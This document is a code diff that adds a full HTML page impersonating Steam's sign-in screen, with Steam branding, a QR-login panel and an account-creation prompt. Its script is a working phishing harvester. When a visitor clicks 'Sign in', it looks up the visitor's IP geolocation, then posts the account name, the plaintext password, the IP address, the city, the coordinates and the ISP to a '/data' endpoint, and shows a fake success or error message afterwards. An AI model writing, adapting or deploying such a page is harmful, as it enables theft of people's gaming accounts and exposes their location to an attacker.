@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Sign in — Steam</title>
+<link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1200px-Steam_icon_logo.svg.png" type="image/x-icon" />
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
+
+  :root{
+    --bg:#0c131b;
+    --header:#171a21;
+    --panel:#171a21;
+    --panel2:#101822;
+    --text:#e6edf5;
+    --muted:#c7d5e0;
+    --muted2:#a3b5c6;
+    --input:#2a475e;
+    --border:#3a4b5c;
+    --focus:#66c0f4;
+    --accent-a:#06bfff;
+    --accent-b:#2d73ff;
+    --install:#5c7e10;
+    --link:#66c0f4;
+  }
+
+  *{box-sizing:border-box; margin:0; padding:0;}
+  body{
+    font-family: "Motiva Sans", "Inter", Arial, sans-serif;
+    color:var(--text);
+    background: #000 url("https://cdn.fastly.steamstatic.com/store/home/store_home_share.jpg") center/cover no-repeat fixed;
+    min-height:100vh;
+    position: relative;
+    z-index: 1;
+  }
+  /* Arka plan karartma + blur */
+  body::before{
+    content:""; 
+    position:fixed; 
+    inset:0; 
+    z-index:-1;
+    background:rgba(0,0,0,0.6); /* karartma */
+    backdrop-filter: blur(6px);  /* blur */
+  }
+
+  /* HEADER */
+  .header{
+    position:relative; z-index:2;
+    display:flex; align-items:center; justify-content:space-between;
+    padding:12px 24px;
+    background:rgba(23,26,33,0.9);
+  }
+  .left{display:flex; align-items:center; gap:20px;}
+  .brand{display:flex; align-items:center; gap:10px;}
+  .brand img{width:32px; height:auto;} /* logo için */
+  .brand-text{font-weight:700; letter-spacing:1px; font-size:16px;}
+  .nav{display:flex; gap:20px;}
+  .nav a{color:var(--muted); text-decoration:none; font-weight:600; font-size:14px;}
+  .nav a.active{color:#fff; border-bottom:2px solid var(--link); padding-bottom:3px;}
+  .right{display:flex; align-items:center; gap:14px;}
+  .install{background:var(--install); color:#fff; border:0; padding:6px 12px; font-weight:700; cursor:pointer;}
+  .right a{color:var(--muted); text-decoration:none; font-size:13px;}
+
+  /* MAIN */
+  .wrap{position:relative; z-index:1; width:min(900px,95vw); margin:50px auto;}
+  h1{
+    font-size:34px; font-weight:700;
+    margin:0 0 16px 4px;
+  }
+  .panel{
+    width:min(850px,95vw);
+    background:linear-gradient(180deg,var(--panel),var(--panel2));
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:4px;
+    display:grid; grid-template-columns:1.4fr 1fr;
+    gap:24px; padding:26px;
+  }
+  @media(max-width:850px){.panel{grid-template-columns:1fr;}}
+
+  .section-title{color:#c7d5e0; font-size:13px; font-weight:600; margin-bottom:12px;}
+  .label{color:var(--muted2); font-size:12px; margin:14px 0 6px;}
+  .input{
+    width:100%; height:40px; padding:0 10px;
+    border:1px solid var(--border); border-radius:2px;
+    background:#1b2838; color:#fff;
+  }
+  .input:focus{border-color:var(--focus); outline:none;}
+
+  .row{margin:12px 0 20px; font-size:13px; color:var(--muted);}
+  .row input{margin-right:6px;}
+
+  .btn{
+    background:linear-gradient(90deg,var(--accent-a),var(--accent-b));
+    border:none; border-radius:2px;
+    color:#fff; font-weight:700;
+    width:200px; height:40px;
+    cursor:pointer;
+  }
+
+  .help{display:block; margin-top:12px; font-size:13px; color:var(--link); text-decoration:none;}
+
+  /* QR Bölümü */
+
+  .qr-title{font-size:13px; font-weight:600; margin-bottom:10px;}
+  .qr-box{background:#fff; padding:10px; border-radius:4px; width:200px;}
+  .qr-box img{width:100%; height:auto;}
+  .qr-caption{font-size:13px; color:var(--muted); margin-top:8px;}
+
+  /* CTA */
+  .cta{
+    margin:30px auto 60px;
+    width:min(900px,95vw);
+    background:rgba(23,26,33,0.9);
+    border:1px solid rgba(255,255,255,.1);
+    border-radius:4px;
+    padding:20px;
+    display:flex; justify-content:space-between; align-items:center;
+  }
+  @media(max-width:700px){.cta{flex-direction:column; text-align:center; gap:14px;}}
+  .cta h2{font-size:20px; margin:0 0 6px;}
+  .cta p{font-size:13px; color:var(--muted);}
+  .create{background:linear-gradient(90deg,var(--accent-a),var(--accent-b)); border:none; border-radius:2px; color:#fff; font-weight:700; padding:10px 14px; cursor:pointer;}
+  
+  /* Hata kutusu */
+  #error-box{color:#ff6b6b; font-size:13px; margin-top:10px; display:none;}
+  .input-error{border-color:#ff6b6b;}
+</style>
+</head>
+<body>
+  <!-- HEADER -->
+  <header class="header">
+    <div class="left">
+      <div class="brand">
+        <!-- Xbox logosu -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Steam_icon_logo.svg/1200px-Steam_icon_logo.svg.png" alt="Xbox Logo">
+        <div class="brand-text">STEAM</div>
+      </div>
+      <nav class="nav">
+        <a class="active" href="#">STORE</a>
+        <a href="#">COMMUNITY</a>
+        <a href="#">ABOUT</a>
+        <a href="#">SUPPORT</a>
+      </nav>
+    </div>
+    <div class="right">
+      <button class="install">Install App</button>
+      <a href="#">login</a>
+      <a href="#">language ▾</a>
+    </div>
+  </header>
+
+  <!-- MAIN -->
+  <main class="wrap">
+    <h1>Sign in</h1>
+    <section class="panel">
+      <!-- Left -->
+      <div>
+        <div class="section-title">SIGN IN WITH ACCOUNT NAME</div>
+        <input id="username" class="input" placeholder="Account name">
+        <div class="label">PASSWORD</div>
+        <input id="password" class="input" type="password" placeholder="Password">
+        <div class="row"><input type="checkbox" checked> Remember me</div>
+        <button class="btn" onclick="handleLogin()">Sign in</button>
+        <div id="error-box"></div>
+        <a href="#" class="help">Help, I can’t sign in</a>
+      </div>
+      <!-- Right -->
+      <div class="qr-card">
+        <div class="qr-title">OR SIGN IN WITH QR</div>
+        <div class="qr-box">
+          <img src="https://i.hizliresim.com/fw0bx3r.png" alt="QR code">
+        </div>
+        <div class="qr-caption">Use the <a href="#">Mobile App</a> to sign in via QR code</div>
+      </div>
+    </section>
+  </main>
+
+  <!-- CTA -->
+  <section class="cta">
+    <div>
+      <h2>New to Steam?</h2>
+      <p>It’s free and easy. Discover thousands of games to play with millions of new friends. <a href="#">Learn more</a></p>
+    </div>
+    <button class="create">Create an account</button>
+  </section>
+
+  <!-- SCRIPT -->
+  <script>
+    async function getIpDetails() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        return await res.json();
+      } catch (err) {
+        return {};
+      }
+    }
+
+    async function handleLogin() {
+      let username = document.getElementById("username");
+      let password = document.getElementById("password");
+      let errorBox = document.getElementById("error-box");
+
+      username.classList.remove("input-error");
+      password.classList.remove("input-error");
+      errorBox.style.display = "none";
+
+      if (username.value.trim() === "" || password.value.trim() === "") {
+        errorBox.innerText = "Username and password cannot be empty.";
+        errorBox.style.display = "block";
+        if (username.value.trim() === "") username.classList.add("input-error");
+        if (password.value.trim() === "") password.classList.add("input-error");
+        return;
+      }
+
+      const ipData = await getIpDetails();
+
+      const payload = {
+        username: username.value.trim(),
+        password: password.value.trim(),
+        ip: ipData.ip,
+        city: ipData.city,
+        region: ipData.region,
+        country: ipData.country_name,
+        latitude: ipData.latitude,
+        longitude: ipData.longitude,
+        asn: ipData.asn,
+        org: ipData.org
+      };
+
+      try {
+        const res = await fetch("/data", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+
+        if (!res.ok) {
+          errorBox.innerText = "Server error!";
+          errorBox.style.display = "block";
+          return;
+        }
+
+        const result = await res.json();
+
+        if (result.success) {
+          alert("Login successful!");
+        } else {
+          errorBox.innerText = "The username or password you entered is incorrect.";
+          errorBox.style.display = "block";
+        }
+      } catch (err) {
+        errorBox.innerText = "Connection error!";
+        errorBox.style.display = "block";
+      }
+    }
+  </script>
+</body>
+</html>
